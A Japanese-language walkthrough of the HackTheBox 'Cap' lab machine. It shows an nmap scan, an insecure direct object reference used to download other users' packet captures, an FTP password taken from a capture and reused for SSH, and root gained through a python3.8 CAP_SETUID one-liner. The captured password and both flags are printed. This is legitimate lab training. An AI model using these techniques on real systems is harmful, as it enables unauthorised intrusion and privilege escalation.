---
title: Cap writeup
draft: false
tags:
  - "#HackTheBox"
  - Writeup
---
 

https://app.hackthebox.com/machines/Cap
ターゲットマシンIPアドレス：`10.10.10.245`

---
## Guided Mode
### Task 1: How many TCP ports are open?
- どのポートが空いているか確認する
	- ポートスキャンツール「[[nmap]]」を使う
		- オプション`-sS` はTCP SYNスキャンを行う
			- （3-Wayハンドシェイクを確立させるTCP Connectスキャンと比較して、ハンドシェイク確立前に通信を切るため、少しは速いらしい）
		- オプション`-Pn`はスキャン前のPINGを省略する
		- オプション`-p-`は全ポートを対象とする
			- 今回はいきなり全体へのスキャンを行いました
			- スキャンに時間がかかるため、オプション無し（〜1024ポートまで）のスキャンして回答してみて、駄目であれば`-p`でスキャン範囲を広げる、といった感じで問題ないと思います
		- オプション`-T4`はスキャン間隔を小刻みに設定
			- T0（遅い）〜T5（速すぎて不安定？）まであると聞いた
			- 公式マニュアル上でT4がおすすめと書いてあるため、自分は軽率にT4を使う
				- https://nmap.org/man/ja/man-performance.html
```bash
└─$ sudo nmap -sS -Pn 10.10.10.245 -p- -T4
Place your right index finger on the fingerprint reader
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 19:58 JST

Nmap scan report for 10.10.10.245
Host is up (0.11s latency).
Not shown: 65503 closed tcp ports (reset), 29 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 606.23 seconds

```
- Answer: `3`

### Task 2: After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?
> 翻訳：「セキュリティスナップショット」を実行した後、ブラウザは`/[something]/[id]`という形式のパスにリダイレクトされます。ここで、`[id]`はスキャンのID番号を表します。`[something]`は何ですか？

- セキュリティスナップショットの実行？
- 空いているポートから、Webサーバーが動いているようなので、とりあえず覗いてみます
	- これのことでした
	- ![[Pasted image 20241111204317.png]]
	- 左のメニューから「Security Snapshot」を押してみます
		- このときのURLを見ると、`http://10.10.10.245/data/12`でした
- Answer: `data`

### Task 3: Are you able to get to other users' scans?
> 翻訳：他のユーザーのスキャンにアクセスできますか？
- 先のURLにおける`id`部分を変更したら、他のスキャン結果にアクセスできそうな気がします
	- `http://10.10.10.245/data/1`
	- ![[Pasted image 20241111204837.png]]
	- アクセスできました
		- このTaskとは関係のない話ですが、`/data/0`,`/data/1`,`/data/2`の結果を見ると、いくつかのパケットをキャプチャしていました
		- 4,5ページ試しただけですが、`/data/3`以降は0件……スキャン結果が特に無いように見えます
- Answer: `yes`

### Task 4: What is the ID of the PCAP file that contains sensative data?
> 翻訳：機密データを含むPCAPファイルのIDは何ですか？
-  機密データ？
- とりあえず`data/0`から順番にパケットキャプチャの結果をダウンロードして、中身を覗いてみます
	- `0.pcap`
		- ![[Pasted image 20241111210412.png]]
		- FTPのログインパスワードがキャプチャされてる！　これだ！！
- Answer: `0`

### Task 5: Which application layer protocol in the pcap file can the sensetive data be found in?
> 翻訳：pcapファイル内のどのアプリケーション層プロトコルに機密データが見つかりますか？
- Task 4に記載した通り、発見したのは「FTP」の機密データとなります
- Answer: `ftp`

### Task 6: We've managed to collect nathan's FTP password. On what other service does this password work?
> 翻訳：私たちはナサンのFTPパスワードを収集することに成功しました。このパスワードは他にどのサービスで使えますか？

- Task 1で確認した通り、ターゲットマシン上では以下の3ポートが開放されています
	- 21（FTP）
	- 22（SSH）
	- 80（HTTP）
- とりあえず、SSHログインを行ってみます
```bash
└─$ ssh nathan@10.10.10.245

※省略。パスワードを要求されるので、先ほど収集したパスワード「Buck3tH4TF0RM3!」を入力

nathan@cap:~$ 
```
- ログインできました
- Answer: `ssh`

### Submit User Flag: Submit the flag located in the nathan user's home directory.

- ホームディレクトリの中を覗くと`user.txt`がありました
```sh
nathan@cap:~$ ls
linpeas.sh  snap  user.txt

nathan@cap:~$ cat user.txt 
a6f863d6830f4c745ba8917b859f7a33

```

- User Flag: `a6f863d6830f4c745ba8917b859f7a33`

### Task 8: What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?
> 翻訳：このマシン上で特別な機能を持ち、root権限を取得するために悪用できるバイナリのフルパスは何ですか？

- 先ほどホームディレクトリ上に`linpeas.sh` があったことを確認しました
	- 権限昇格のために必要な情報などを列挙してくれる便利ツールです
		- `LinPEAS - Linux Privilege Escalation Awesome Script`

- 実行権限を与えて動かしてみます
	- 念のため、あわせてファイル出力もしておきます
	- ここで出力したファイルは、色をつけるための特殊文字がふんだんに含まれているため、そのままではとても読みづらいです
	- `less -R ファイル名`を実行することで、色付きで読むことができます
```sh
nathan@cap:~$ chmod u+x linpeas.sh 

# 補足
# teeコマンド：標準入力から受け取った内容を、標準出力とファイルに書き出すコマンドです。
# 別のコマンドの実行結果をパイプでteeに渡してあげると、画面でコマンドの動きを確認しつつ、結果をファイルに書き込むこともできます。
nathan@cap:~$ ./linpeas.sh | tee out.txt
※省略
```

- ![[Pasted image 20241111213352.png]]
- Answer: `/usr/bin/python3.8`

### Submit Root Flag: Submit the flag located in root's home directory.

- Task 8で発見した`/usr/bin/python3.8`を用いて権限昇格を試みます
	- https://gtfobins.github.io/gtfobins/python/#capabilities
		- `If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.`
		- 翻訳：`バイナリにLinuxのCAP_SETUID機能が設定されている場合、またはその機能が設定された別のバイナリによって実行される場合、自身のプロセスUIDを操作することで特権アクセスを維持するバックドアとして使用することができます。`
	- 記載されているコードを、環境にあわせて書き換えて実行してみます
		- `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
```sh
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# 
# whoami
root
# 
```
- 俺がrootだ！

- タスクの目標であるフラグを探しに行きます
```sh
# cd /root
# ls
root.txt  snap

# cat root.txt
1997c117d673d32b760582f88f67e251
```
- Root Flag: `1997c117d673d32b760582f88f67e251`